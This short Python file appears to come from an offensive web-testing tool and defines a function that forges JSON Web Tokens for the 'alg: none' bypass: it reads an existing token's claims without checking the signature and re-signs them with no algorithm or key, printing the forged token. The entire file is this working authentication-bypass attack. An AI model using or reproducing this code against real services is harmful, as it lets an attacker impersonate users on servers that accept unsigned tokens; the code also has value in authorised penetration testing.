import jwt
from colorama import Fore

def craft_none_alg_bypass(original_token):
    try:
        header = {"alg": "none", "typ": "JWT"}
        payload = jwt.decode(original_token, options={"verify_signature": False})
        new_token = jwt.encode(payload, key=None, algorithm=None, headers=header)
        print(Fore.GREEN + "[+] JWT None Algorithm token generated:")
        print(new_token)
        return new_token
    except Exception as e:
        print(Fore.RED + f"[-] Failed to create None-alg JWT: {str(e)}")
